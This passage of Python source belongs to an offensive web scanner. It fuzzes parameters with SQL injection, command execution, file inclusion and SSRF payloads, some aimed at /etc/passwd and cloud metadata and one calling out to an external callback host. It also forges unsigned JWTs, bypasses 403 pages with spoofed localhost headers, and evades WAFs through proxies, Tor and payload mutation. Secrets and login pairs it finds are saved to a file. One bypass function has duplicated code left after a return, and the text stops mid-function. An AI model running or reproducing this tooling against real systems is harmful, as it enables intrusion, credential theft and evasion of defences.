                         self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: Potential Web Cache Deception at {deception_url}</span>")
                         vuln = Vulnerability(
                             target=deception_url, 
                             vuln_type="Web Cache Deception", 
                             severity="HIGH", 
                             impact="Sensitive user data may be cached as static file",
                             comando_direto=f"curl -v {deception_url}"
                         )
                         self._emit_finding(vuln)
                         break

    def extract_sensitive_data(self, content, source_url):
        if not content: return
        
        # 0. Check for Data Dumps (SQL, ENV, Shadow, etc)
        try:
            if self.dumper:
                found, dtype, dmsg = self.dumper.analyze(source_url, content)
                if found:
                    self.log_message.emit(f"<span style='color:#ff00ff; font-weight:bold'>[★] DATA DUMP FOUND: {dtype}</span>")
                    self.log_message.emit(f"<span style='color:#aaa'>    - {dmsg}</span>")
                    vuln = Vulnerability(
                        target=source_url, 
                        vuln_type=f"Data Dump ({dtype})", 
                        severity="CRITICAL", 
                        impact=dmsg,
                        comando_direto=f"curl -s {source_url}"
                    )
                    self._emit_finding(vuln)
        except Exception:
            pass

        patterns = {
            # Cloud & Infrastructure
            "AWS Access Key ID": r"AKIA[0-9A-Z]{16}",
            "AWS Secret Access Key": r"(?i)aws_?secret_?access_?key['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9\/+=]{40})",
            "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
            "Google OAuth": r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
            "Azure Storage Key": r"[a-z0-9]+.blob.core.windows.net",
            "Heroku API Key": r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}",
            
            # SaaS & APIs
            "Slack Token": r"xox[baprs]-([0-9a-zA-Z]{10,48})",
            "Slack Webhook": r"https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
            "Stripe Secret": r"sk_live_[0-9a-zA-Z]{24}",
            "Stripe Publishable": r"pk_live_[0-9a-zA-Z]{24}",
            "Facebook Access Token": r"EAACEdEose0cBA[0-9A-Za-z]+",
            "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
            "Twilio API Key": r"SK[0-9a-fA-F]{32}",
            "Mailgun API Key": r"key-[0-9a-zA-Z]{32}",
            "PayPal Braintree": r"access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}",
            
            # Private Keys & Auth
            "Private Key": r"-----BEGIN [A-Z]+ PRIVATE KEY-----",
            "SSH Private Key": r"-----BEGIN OPENSSH PRIVATE KEY-----",
            
            # Generic Secrets (High False Positive Potential, handled carefully)
            "Generic API Key": r"(?i)(api_key|apikey|access_token|auth_token)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{32,64})['\"]?",
            "Generic Password": r"(?i)(password|passwd|pwd|secret)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9@#$%^&*_\-]{8,64})['\"]?",
            "Authorization Header": r"(?i)Authorization:\s*(Bearer|Basic)\s+([a-zA-Z0-9._\-]+)",
            
            # PII
            "Email Address": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "IP Address (Internal)": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.1[6-9]\.\d{1,3}\.\d{1,3}|172\.2[0-9]\.\d{1,3}\.\d{1,3}|172\.3[0-1]\.\d{1,3}\.\d{1,3})\b",
            "JWT Token": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"
        }
        for title, regex in patterns.items():
            matches = re.findall(regex, content)
            for match in matches:
                if isinstance(match, tuple):
                    # If multiple groups (key, value), join them for context
                    val_str = " | ".join(match)
                else:
                    val_str = str(match)

                # SHOW FULL DATA (No Truncation)
                display_val = val_str 
                self.sensitive_data_found.emit(title, display_val)
                # Auto-save sensitive data evidence
                self.save_evidence(source_url, f"Sensitive_Data_{title}", content)
                
                if title == "JWT Token" and getattr(self, 'governor_mode', False):
                    asyncio.create_task(self._deep_analyze_jwt(source_url, display_val))
        
        # Check for credential pairs (Email/User + Password)
        self._scan_for_credentials(content, source_url)

    async def _deep_analyze_jwt(self, url, token):
        try:
            parts = token.split('.')
            if len(parts) != 3: return
            
            import base64, json
            def decode_b64(s):
                return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4)).decode('utf-8')
            
            header = json.loads(decode_b64(parts[0]))
            payload = json.loads(decode_b64(parts[1]))
            
            self.log_message.emit(f"<span style='color:#00ff9d'>[Governor] Deep JWT Analysis: Algo={header.get('alg')} | Payload={str(payload)[:50]}...</span>")
            
            # Test 'None' Algorithm
            header['alg'] = 'none'
            encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            altered_token = f"{encoded_header}.{parts[1]}."
            
            headers = self.get_headers()
            headers['Authorization'] = f"Bearer {altered_token}"
            
            s, c, h, l = await self._safe_request('GET', url, headers=headers, timeout=5)
            if s == 200 and len(c) > 0:
                self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: JWT 'none' algo bypass might be possible on {url}</span>")
                vuln = Vulnerability(
                    target=url, 
                    vuln_type="JWT Signature Bypass (None Algo)", 
                    severity="CRITICAL", 
                    impact="Token accepted without signature",
                    comando_direto=f"curl -H \"Authorization: Bearer {altered_token}\" {url}"
                )
                self._emit_finding(vuln)
        except Exception:
            pass

    def _scan_for_credentials(self, content, url):
        """Heuristic scan for credential pairs."""
        # 1. Connection Strings (High Confidence)
        # mysql://user:pass@host
        auth_uris = re.findall(r'(?:mysql|postgres|mongodb|redis|amqp)://([a-zA-Z0-9_]+:[a-zA-Z0-9_@#$%^&*]+)@', content)
        for cred in auth_uris:
             self._log_credential(url, "Service Auth", cred)

        # 2. JSON/Config Proximity Check (Medium Confidence)
        # Look for "email": "..." ... "password": "..."
        if len(content) < 50000: # Limit heavy processing
             # Normalize simple quotes
             text = content.replace("'", '"')
             
             # Regex for "key": "value"
             duplicates = set()
             
             # Find "email" or "username" fields
             user_matches = list(re.finditer(r'"(?:email|username|user|login)"\s*:\s*"([^"]+)"', text, re.IGNORECASE))
             pass_matches = list(re.finditer(r'"(?:password|passwd|pwd|secret)"\s*:\s*"([^"]+)"', text, re.IGNORECASE))
             
             for u in user_matches:
                  for p in pass_matches:
                       # Check distance (e.g., within 200 chars)
                       dist = abs(u.start() - p.start())
                       if dist < 200:
                            password = p.group(1)
                            # ENTROPY ANALYSIS
                            entropy = self._calculate_entropy(password)
                            quality = "LOW (Probable Placeholder)"
                            if entropy > 4.0:
                                 quality = "HIGH (Complex/Real)"
                            elif entropy > 3.0:
                                 quality = "MEDIUM"
                            
                            pair = f"{u.group(1)}:{password} | Quality: {quality} (Entropy: {entropy:.2f})"
                            
                            if pair not in duplicates:
                                 # Only log Medium+ to avoid noise if desired, or log all with tags
                                 self._log_credential(url, f"Possible Login [{quality}]", pair)
                                 duplicates.add(pair)

    def _calculate_entropy(self, text):
        """Calculates Shannon Entropy to determine string randomness."""
        import math
        if not text: return 0
        entropy = 0
        for x in range(256):
            p_x = float(text.count(chr(x)))/len(text)
            if p_x > 0:
                entropy += - p_x * math.log(p_x, 2)
        return entropy

    def _log_credential(self, url, ctype, creds):
        """Saves credential to the master logins found file."""
        log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{ctype}] {creds} | Source: {url}\n"
        
        # Save to global logins file
        file_path = os.path.join("scans", "logins_found.txt")
        with open(file_path, "a", encoding="utf-8") as f:
             f.write(log_entry)
        
        self.log_message.emit(f"<span style='color:#ff00ff; font-weight:bold'>[★] LOGIN FOUND: {creds} ({ctype}) saved to logins_found.txt</span>")
    async def _safe_request(self, method, url, **kwargs):
        """Wrapper over aiohttp to handle timeouts, dynamic scaling, and failures gracefully."""
        if not self.session: 
             self.session = aiohttp.ClientSession()
        
        # Override baseline timeout with Dynamic Scaling if enabled
        base_timeout = kwargs.get('timeout', 15)
        if self.dynamic_timeout:
             base_timeout += 30
             
        retries = 3 if self.bypass_mode else 2
        host = urlparse(url).netloc
        
        for attempt in range(retries):
            # Polymorphic Payload Mutation
            if self.bypass_mode and 'params' in kwargs and self.polymorphic_ai:
                params = kwargs.get('params')
                current_waf = self.waf_profiler.target_profiles.get(host, "Unknown")
                if isinstance(params, dict):
                    for key, val in params.items():
                        if isinstance(val, str) and len(val) > 3:
                            params[key] = await self.polymorphic_ai.mutate_payload(val, url, waf=current_waf)

            # Dynamic Evasion Headers per attempt
            current_headers = kwargs.get('headers', self.get_headers()).copy()
            waf_headers = self.waf_profiler.get_evasion_headers(host)
            current_headers.update(waf_headers)
            kwargs['headers'] = current_headers

            try:
                timeout = aiohttp.ClientTimeout(total=base_timeout)
                if self.bypass_mode and hasattr(self, 'current_jitter_enabled'):
                     await asyncio.sleep(random.uniform(0.5, 2.5))

                proxy = self.proxy_manager.get_proxy() if self.bypass_mode else None
                if self.proxychains:
                    proxy = "socks5://127.0.0.1:9050"

                async with self.acc.sem:
                    start_time = time.time()
                    
                    if method.upper() == 'GET':
                        async with self.session.get(url, proxy=proxy, timeout=timeout, **kwargs) as r:
                             elapsed = time.time() - start_time
                             self.waf_profiler.profile(host, r.headers)
                             await self.acc.adjust(r.status, elapsed)
                             self._track_baseline_latency(url, elapsed)
                             self.request_count += 1
                             
                             if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
                                 self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
                                 await asyncio.sleep(random.uniform(3.0, 8.0))
                                 if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
                                 continue
                                 
                             if self.error_bypass and r.status in [401, 403, 500]:
                                 status, content, headers, elapsed_bypass = await self._attempt_error_bypass(url, r.status, kwargs)
                                 return status, content, headers, elapsed_bypass
                                 
                             return r.status, await r.read(), r.headers, elapsed

                    elif method.upper() == 'POST':
                        async with self.session.post(url, proxy=proxy, timeout=timeout, **kwargs) as r:
                             elapsed = time.time() - start_time
                             self.waf_profiler.profile(host, r.headers)
                             await self.acc.adjust(r.status, elapsed)
                             self._track_baseline_latency(url, elapsed)
                             self.request_count += 1
                             
                             if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
                                 self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
                                 await asyncio.sleep(random.uniform(3.0, 8.0))
                                 if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
                                 continue
                                 
                             if self.error_bypass and r.status in [401, 403, 500]:
                                 status, content, headers, elapsed_bypass = await self._attempt_error_bypass(url, r.status, kwargs, method='POST')
                                 return status, content, headers, elapsed_bypass
                                 
                             return r.status, await r.read(), r.headers, elapsed

            except Exception:
                if attempt < retries - 1:
                    await asyncio.sleep(1 * (attempt + 1))
                    continue
                return 0, b"", {}, 0.0
                
        return 0, b"", {}, 0.0

    def _track_baseline_latency(self, parsed_url, elapsed):
        if not hasattr(self, '_latencies'): self._latencies = {}
        host = urlparse(parsed_url).netloc
        if host not in self._latencies:
            self._latencies[host] = []
        self._latencies[host].append(elapsed)
        if len(self._latencies[host]) > 50:
             self._latencies[host] = self._latencies[host][-50:] # Keep rolling window

    async def _attempt_error_bypass(self, url, original_status, kwargs, method='GET'):
        """Attempts to bypass 401/403/500 errors using path normalization and HTTP method toggling."""
        self.log_message.emit(f"<span style='color:#ff0055'>[Bypass] Received {original_status} on {url}. Attempting GOVERNOR ESCALATION...</span>")
        
        parsed = urlparse(url)
        path = parsed.path
        
        bypass_paths = [
            f"{path}/%2e/",
            f"{path}/.",
            f"// {path}//",
            f"{path}/..;/",
            f"{path}..;/",
            f"{path}.json",
            f"{path}.php",
            f"{path}%20"
        ]
        
        for bpath in bypass_paths:
            new_url = urlunparse(parsed._replace(path=bpath))
            s, c, _, _ = await self._safe_request(method, new_url, **kwargs)
            if s == 200:
                self.log_message.emit(f"<span style='color:#00ff9d'>[+] GOVERNOR BYPASS SUCCESS: {new_url} (Status: 200)</span>")
                vuln = Vulnerability(target=url, vuln_type="403 Forbidden Bypass", severity="HIGH", impact=f"Access granted via path normalization: {bpath}")
                self._emit_finding(vuln)
                return s, c, {}, 0
        
        # Method Toggling
        if method == 'GET':
            s, c, _, _ = await self._safe_request('POST', url, **kwargs)
            if s == 200:
                self.log_message.emit(f"<span style='color:#00ff9d'>[+] GOVERNOR BYPASS SUCCESS: {url} (HTTP POST conversion)</span>")
                return s, c, {}, 0

        # Header Manipulation is already handled in get_headers if governor_mode is on
        return original_status, b"", {}, 0
        # Tactic 1: Path Normalization Bypass (/%2e/path, /path/., //path)
        bypass_paths = [
            f"/{path}", f"//{path}", f"{path}/.", f"{path}/%2e", f"/%2e{path}"
        ]
        
        for b_path in bypass_paths:
            test_url = urlunparse((parsed.scheme, parsed.netloc, b_path, parsed.params, parsed.query, parsed.fragment))
            try:
                # Use GET regardless of original method to test access
                async with self.session.get(test_url, timeout=5, **kwargs) as r:
                     if r.status == 200:
                         self.log_message.emit(f"<span style='color:#00ff9d'>[SUCCESS] Bypassed {original_status} using path: {b_path}</span>")
                         return r.status, await r.read(), r.headers, 0
            except:
                pass
                
        # Tactic 2: HTTP Method toggle (e.g. POST to GET or GET to POST)
        toggle_method = 'POST' if method == 'GET' else 'GET'
        try:
             async with self.session.request(toggle_method, url, timeout=5, **kwargs) as r:
                 if r.status == 200:
                     self.log_message.emit(f"<span style='color:#00ff9d'>[SUCCESS] Bypassed {original_status} by switching to {toggle_method}</span>")
                     return r.status, await r.read(), r.headers, 0
        except:
             pass

        # Tactic 3: ACTIVE 403 BYPASS (Header Overrides)
        if getattr(self, 'active_403_bypass', False):
            self.log_message.emit(f"<span style='color:#ff00ff'>[Stealth] Injecting 403 Override Headers...</span>")
            override_headers = kwargs.get('headers', self.get_headers()).copy()
            override_headers.update({
                "X-Original-URL": path,
                "X-Rewrite-URL": path,
                "X-Custom-IP-Authorization": "127.0.0.1",
                "X-Forwarded-For": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Host": "127.0.0.1",
                "Base-Url": "127.0.0.1"
            })
            
            override_kwargs = kwargs.copy()
            override_kwargs['headers'] = override_headers
            
            try:
                 async with self.session.request(method, url, timeout=5, **override_kwargs) as r:
                     if r.status == 200:
                         self.log_message.emit(f"<span style='color:#00ff9d'>[SUCCESS] Bypassed {original_status} using 127.0.0.1 Localhost Header Spoofing!</span>")
                         return r.status, await r.read(), r.headers, 0
            except:
                 pass

        return original_status, b"", {}, 0

    def resolve_domain(self, hostname):
        """Uses dnspython, tldextract, and whois for comprehensive recon."""
        try:
            # DNS Resolution
            answers = dns.resolver.resolve(hostname, 'A')
            ips = [r.to_text() for r in answers]
            
            # TLD Extraction
            ext = tldextract.extract(hostname)
            domain_info = f"{ext.domain}.{ext.suffix}"
            
            # WHOIS Lookup (sync, might block slightly, but minimal impact in thread)
            try:
                w = whois.whois(domain_info)
                registrar = w.registrar or "Unknown"
                creation_date = w.creation_date
                if isinstance(creation_date, list): creation_date = creation_date[0]
                self.log_message.emit(f"<span style='color:#aaa'>    - Registrar: {registrar} | Created: {creation_date}</span>")
            except Exception:
                pass
                
            return ips
        except Exception as e:
            self.log_message.emit(f"<span style='color:#aaaaaa'>[Debug] DNS/Whois lookup failed for {hostname}: {str(e)}</span>")
            return []

    async def analyze_forms(self, url, content):
        """Uses BeautifulSoup to find forms and potential vulnerabilities."""
        try:
            soup = await asyncio.to_thread(BeautifulSoup, content, 'lxml')
            forms = soup.find_all('form')
            
            if forms:
                self.log_message.emit(f"<span style='color:#00f3ff'>[INFO] Found {len(forms)} forms on {url}</span>")
                # Store for Auth Bypass Engine
                if not hasattr(self, 'discovered_forms'): self.discovered_forms = []
                self.discovered_forms.extend(forms)
                
            for form in forms:
                action = form.get('action') or url
                method = form.get('method', 'get').upper()
                inputs = form.find_all('input')
                
                # Log form details for the user
                input_names = [i.get('name') for i in inputs if i.get('name')]
                if input_names:
                     self.log_message.emit(f"<span style='color:#aaa'>    - Form ({method}) to {action}: inputs={input_names}</span>")
                
                # Check for password fields (Basic heuristic)
                for inp in inputs:
                    if inp.get('type') == 'password':
                        self.log_message.emit(f"<span style='color:#ffcc00'>    [!] Login Form Detected! Target: {action}</span>")
                        
        except Exception as e:
            # Don't crash on soup errors
            pass

    async def analyze_js_files(self, url):
        """Analyzes JS files for secrets (Stub to prevent crash if not implemented)."""
        # This is largely handled by the Crawler + Asset Analysis phase now, 
        # but kept here for the detect_tech call flow.
        pass

    def apply_payload_encoding(self, payload):
        """Dynamically encodes payloads (URL, Base64) to prevent parser crashes and guarantee valid tokenization."""
        import urllib.parse
        
        if getattr(self, 'governor_mode', False):
            # Weighted random choice based on WAF Heuristics
            strategies = {
                'url_encode': lambda p: urllib.parse.quote(p),
                'double_url_encode': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
                'html_entity': lambda p: p.replace("<", "%3C").replace(">", "%3E").replace(" ", "%20"),
                'script_camel': lambda p: p.replace("script", "sCrIpT"),
                'quotes_hex': lambda p: p.replace("'", "%27").replace('"', "%22"),
                'plain': lambda p: p
            }
            
            # Select strategy based on historical success weight
            total_weight = sum(self._waf_bypass_stats.values())
            r = random.uniform(0, total_weight)
            upto = 0
            selected_key = 'plain'
            for key, weight in self._waf_bypass_stats.items():
                if upto + weight >= r:
                    selected_key = key
                    break
                upto += weight
                
            self._last_used_encoding = selected_key
            return strategies[selected_key](payload)
        if not getattr(self, 'payload_encode', False): return payload
        
        # Example contexts: sometimes a payload needs double URL encoding to reach backend
        import urllib.parse
        # Randomly apply an encoding strategy to test backend decoding
        strategies = [
            lambda p: urllib.parse.quote(p), # URL Encode
            lambda p: urllib.parse.quote(urllib.parse.quote(p)), # Double URL Encode
            lambda p: p # Plain
        ]
        encoded = random.choice(strategies)(payload)
        return encoded



    async def detect_tech(self, url):
        status, content, headers, _ = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
        text_content = content.decode('utf-8', errors='ignore')
        self.extract_sensitive_data(text_content, url)
        await self.analyze_forms(url, text_content)
        await self.analyze_js_files(url) 
        
        tech_stack = []
        server = headers.get('Server', '').lower()
        powered = headers.get('X-Powered-By', '').lower()
        
        if 'php' in powered or 'php' in server: tech_stack.append('php')
        if 'asp' in powered or 'iis' in server: tech_stack.append('asp')
        if 'nginx' in server: tech_stack.append('nginx')
        if 'express' in powered or 'node' in powered: tech_stack.append('node')
        
        return tech_stack

    def _validate_content(self, path, content):
        """Validates content to STRICTLY prevent HTML soft-404s from being saved as evidence."""
        if not content: return False
        
        # Convert snippet to lower for case-insensitive checking
        header = content[:1500].lower()
        
        # STRONG indicators of HTML/SPA (React, Vue, Vite, etc)
        spa_indicators = [
            b"<!doctype html", b"<html", b"<body", b"<div id=\"root\"", 
            b"<div id=\"app\"", b"vite-plugin-pwa", b"react", b"vue", 
            b"angular", b"nextjs"
        ]
        
        # Check if it looks like a webpage
        is_webpage = any(ind in header for ind in spa_indicators)

        if path.endswith(".sql"):
            # SQL MUST have SQL keywords and MUST NOT be a webpage
            sql_keywords = [b"insert into", b"create table", b"drop table", b"select ", b"values (", b"-- dumping data"]
            has_sql = any(k in header for k in sql_keywords)
            return has_sql and not is_webpage
            
        if path.endswith(".env"):
            # Env MUST have key=value pairs and MUST NOT be a webpage
            has_assign = b"=" in content and b"\n" in content
            return has_assign and not is_webpage
            
        if path.endswith(".git/config"):
            return b"[core]" in content or b"[remote" in content
            
        if path.endswith("id_rsa"):
            return b"PRIVATE KEY" in content
            
        if path.endswith(".yml") or path.endswith(".yaml"):
            return b":" in content and not is_webpage
            
        if path.endswith(".php"):
             if "phpinfo" in path:
                 return b"phpinfo()" in content or b"PHP Version" in content
             # For config.php, if it's executable code (<?php), it's valid finding
             if b"<?php" in content: return True
             return False
        
        # Default: If it looks like a webpage, reject it (unless we are looking for a webpage?)
        if is_webpage: return False
        
        return True

    async def check_sensitive_files(self, url):
        base_url = url.rstrip('/')
        tasks = []

        async def check_path(path):
            full_url = f"{base_url}/{path}"
            status, content, _, _ = await self._safe_request('GET', full_url, headers=self.get_headers(), allow_redirects=False, timeout=5)
            
            if status == 200:
                if not self._validate_content(path, content):
                    return

                text_content = content.decode('utf-8', errors='ignore')
                self.extract_sensitive_data(text_content, full_url)
                
                vuln_name = "Sensitive File Exposure"
                if path == ".env" and b"APP_KEY" in content: vuln_name = "Critical .env Exposure"
                
                vuln = Vulnerability(
                    target=full_url, 
                    vuln_type=vuln_name, 
                    severity="CRITICAL", 
                    impact=f"Exposed {path}",
                    comando_direto=f"curl -s {full_url}"
                )
                self._emit_finding(vuln)
                self.log_message.emit(f"<span style='color:#ff0055'>[!] VULNERABILITY: {vuln_name} at {full_url}</span>")
                
                # Auto-save critical file evidence (EXACT BYTES)
                self.save_evidence(full_url, vuln_name, content)

        # Lazy task creation to avoid "coroutine never awaited" warning on early stop
        for i in range(0, len(self.sensitive_paths), 50): # Increased from 10 to 50 for max concurrency
            if not self.is_running: break
            batch_paths = self.sensitive_paths[i:i+50]
            # Create coroutines for this batch only
            batch_tasks = [check_path(p) for p in batch_paths]
            await asyncio.gather(*batch_tasks)

    async def fuzz_parameters(self, url, tech_stack):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params: return

        active_payloads = {
            'SQLi': Payloads.SQLI,
            'XSS': Payloads.XSS,
            'IDOR': []
        }
        
        if 'php' in tech_stack or not tech_stack:
            active_payloads['LFI'] = Payloads.LFI
            active_payloads['SSTI'] = [p for p in Payloads.SSTI if '{php}' in p or '{{' in p]
        
        if 'node' in tech_stack:
            active_payloads['RCE'] = [p for p in Payloads.RCE if 'process' in p or 'require' in p]
            active_payloads['Prototype Pollution'] = Payloads.PROTO_POLLUTION
        else:
            active_payloads['RCE'] = Payloads.RCE

        if getattr(self, 'governor_mode', False):
            active_payloads['IDOR'] = ['1', '2', '0', '-1', '9999999999', 'admin', '00000000-0000-0000-0000-000000000000', '[]']
            active_payloads['Blind SQLi (Time)'] = ["'; WAITFOR DELAY '0:0:6'--", "1' AND SLEEP(6)--", "1 OR pg_sleep(6)--"]
            active_payloads['Blind RCE (Time)'] = ["; sleep 6", "| sleep 6", "`sleep 6`"]
            active_payloads['Deserialization'] = [
                'O:8:"stdClass":0:{}', 
                'rO0ABXNyAA5qYXZhLmxhbmcuTG9uZw;', 
                'Tzo4OiJzdGRDbGFzcyI6MDp7fQ==' # B64 PHP
            ]
            import socket
            hostname = socket.gethostname()
            active_payloads['Blind SSRF / OOB'] = [
                f"http://127.0.0.1:22",
                f"file:///etc/passwd",
                f"http://localhost/admin",
                f"http://169.254.169.254/latest/meta-data/",
                f"http://pingb.in/p/{hostname}" # Interaction simulation mock
            ]

        # Load safe_fuzz_cases dynamically to improve performance
        try:
            import json, os
            fuzz_file = os.path.join(os.path.dirname(__file__), '..', 'safe_fuzz_cases.json')
            if os.path.exists(fuzz_file):
                 with open(fuzz_file, 'r', encoding='utf-8') as f:
                     raw_fuzz = json.load(f)
                 # Add 5000 variations for deep intensive fuzzing
                 active_payloads['Advanced Fuzzing (Custom)'] = [item.get('payload', '') for item in raw_fuzz if 'payload' in item][:5000]
        except Exception as e:
             self.log_message.emit(f"<span style='color:#ff0000'>[!] Failed to load safe_fuzz_cases: {e}</span>")

        # Queue-based Worker Pattern
        # 1. Create a Queue
        queue = asyncio.Queue()

        # 2. Populate Queue
        for param in params:
            for vuln_type, payloads in active_payloads.items():
                for payload in payloads:
                    if not payload: continue
                    severity = "CRITICAL" if vuln_type in ["SQLi", "RCE", "LFI", "Advanced Fuzzing (Custom)"] else "HIGH"
                    # Default indicators if missing
                    indicators = getattr(Indicators, vuln_type.split()[0].upper(), []) if hasattr(Indicators, vuln_type.split()[0].upper()) else [payload]
                    if not indicators: indicators = [payload]
                    self._inject(parsed, params, param, payload, vuln_type, severity, indicators, queue)

            for payload in [SSRF_PAYLOAD]:
                 self._inject(parsed, params, param, payload, "Potential SSRF", "CRITICAL", ["sheriff-token"], queue)

        # 3. Start Workers
        # Check auto-tune flag to massively scale concurrency
        worker_count = 50 if getattr(self, 'auto_tune', False) else 10
        if getattr(self, 'auto_tune', False):
             self.log_message.emit(f"<span style='color:#ffff00'>[⚡] Auto-Tune Active: Launching {worker_count} concurrent fuzzing agents...</span>")
        
        workers = []
        for _ in range(worker_count):
            task = asyncio.create_task(self._fuzz_worker(queue))
            workers.append(task)
            
        # 4. Wait for queue to be processed
        await queue.join()
        
        # 5. Cancel workers
        for w in workers: w.cancel()

    def _inject(self, parsed, params, param, payload, vuln_type, severity, indicators, queue):
        fuzzed_query = params.copy()
        
        # HTTP Parameter Pollution (HPP) in Governor Mode
        if getattr(self, 'governor_mode', False) and vuln_type == 'IDOR' and payload == 'admin':
            fuzzed_query[param] = ['user', payload]  # Sends ?param=user&param=admin
        elif getattr(self, 'governor_mode', False) and vuln_type == 'IDOR' and payload == '[]':
            del fuzzed_query[param]
            fuzzed_query[f"{param}[]"] = ['1']
        else:
            fuzzed_query[param] = [self.apply_payload_encoding(payload)]
            
        new_query = urlencode(fuzzed_query, doseq=True)
        target_url = urlunparse(parsed._replace(query=new_query))
        
        # Push to Queue (Non-blocking)
        queue.put_nowait((target_url, vuln_type, severity, indicators))

    async def _fuzz_worker(self, queue):
        """Worker that consumes fuzzing tasks from the queue."""
        while True:
            # Get a work item
            url, vuln_type, severity, indicators = await queue.get()
            
            try:
                 # Small sleep to yield control to GUI event loop
                 await asyncio.sleep(0.01)
                 await self._do_fuzz_request(url, vuln_type, severity, indicators)
            except Exception:
                pass
            finally:
                # Notify queue that item is done
                queue.task_done()

    async def _do_fuzz_request(self, url, vuln_type, severity, indicators):
         # No Semaphore needed here as concurrency is limited by worker count
         try:
             # Cloud SSRF Headers
             headers = self.get_headers()
             if vuln_type == 'Blind SSRF / OOB':
                  headers.update({
                      "Metadata": "true",
                      "Metadata-Flavor": "Google",
                      "X-Google-Metadata-Request": "True"
                  })

             status, content, _, latency = await self._safe_request('GET', url, headers=headers, timeout=12)
             text_content = content.decode('utf-8', errors='ignore')
             self.extract_sensitive_data(text_content, url)
             
             # Time-based evaluation
             if vuln_type in ["Blind SQLi (Time)", "Blind RCE (Time)"]:
                 host = urlparse(url).netloc
                 if hasattr(self, '_latencies') and host in self._latencies:
                     avg = sum(self._latencies[host]) / len(self._latencies[host])
                     # If it took longer than baseline + 5.5s (sleep was 6)
                     if latency > (avg + 5.5):
                         vuln = Vulnerability(
                             target=url, 
                             vuln_type=vuln_type, 
                             severity="CRITICAL", 
                             impact=f"Time-based execution confirmed (Latency: {latency:.2f}s, Avg Baseline: {avg:.2f}s)",
                             comando_direto=f"curl -v \"{url}\"" if "SQL" not in vuln_type else f"sqlmap -u \"{url}\" --batch --dbs"
                         )
                         self._emit_finding(vuln)
                         self.log_message.emit(f"<span style='color:#ff0055'>[Governor] APEX BLIND {vuln_type} DETECTED: {url} (Delayed {latency:.2f}s)</span>")
                         self.save_evidence(url, "Blind_Injection", f"Detected delay: {latency:.2f}s over an average of {avg:.2f}s.")
             
             for indicator in indicators:
                 if indicator in text_content: 
                       vuln = Vulnerability(
                           target=url, 
                           vuln_type=vuln_type, 
                           severity=severity, 
                           impact=f"Indicator '{indicator}' found",
                           comando_direto=f"curl -v \"{url}\""
                       )
                       self._emit_finding(vuln)
                       self.log_message.emit(f"<span style='color:#ff0055'>[!] DETECTED: {vuln_type} on {url} (Indicator: {indicator})</span>")
                       
                       # Auto-save fuzzing evidence
                       self.save_evidence(url, vuln_type, text_content)
         except Exception:
             pass

    def save_evidence(self, url, vuln_type, content, extension=None):
        """Saves critical evidence to a local file, preserving original filename/extension."""
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname or "unknown_target"
            path = parsed.path
            
            # Extract basic filename from URL
            url_filename = os.path.basename(path)
            
            # Determine extension if not provided
            if not extension:
                if url_filename and "." in url_filename:
                    _, ext = os.path.splitext(url_filename)
                    extension = ext.lstrip('.')
                else:
                    extension = "txt"
            
            # Sanitize Hostname & Vuln Type
            safe_hostname = "".join([c if c.isalnum() or c in ".-" else "_" for c in hostname])
            safe_vuln = "".join([c if c.isalnum() or c in ".-" else "_" for c in vuln_type])
            
            save_dir = os.path.join("scans", safe_hostname, safe_vuln)
            os.makedirs(save_dir, exist_ok=True)
            
            # Construct Filename
            timestamp = int(time.time())
            
            if url_filename:
                # Sanitize the original filename (keep .env, config.php, etc)
                safe_url_filename = "".join([c if c.isalnum() or c in ".-_" else "_" for c in url_filename])
                # If the sanitized name became empty or just dots (unlikely but possible), fallback
                if not safe_url_filename or all(c in '.' for c in safe_url_filename):
                     filename = f"evidence_{timestamp}.{extension}"
                else:
                     filename = f"{timestamp}_{safe_url_filename}"
            else:
                filename = f"evidence_{timestamp}.{extension}"
            
            file_path = os.path.join(save_dir, filename)
            
            # Write content based on type (Bytes = Exact Copy, Str = Log with Metadata)
            if isinstance(content, bytes):
                with open(file_path, "wb") as f:
                    f.write(content)
            else:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(f"URL: {url}\n")
                    f.write(f"Timestamp: {time.ctime()}\n")
                    f.write("-" * 40 + "\n")
                    f.write(content)
                
            self.log_message.emit(f"<span style='color:#00ff00'>[+] EVIDENCE SAVED: {file_path}</span>")
            return file_path
        except Exception as e:
            self.log_message.emit(f"<span style='color:#ff0000'>[!] Failed to save evidence: {str(e)}</span>")
            return None

    def _verify_integrity(self, vuln):
        """Strict validation of vulnerabilities to avoid false positives."""
        if not self.strict_validation: return True
        
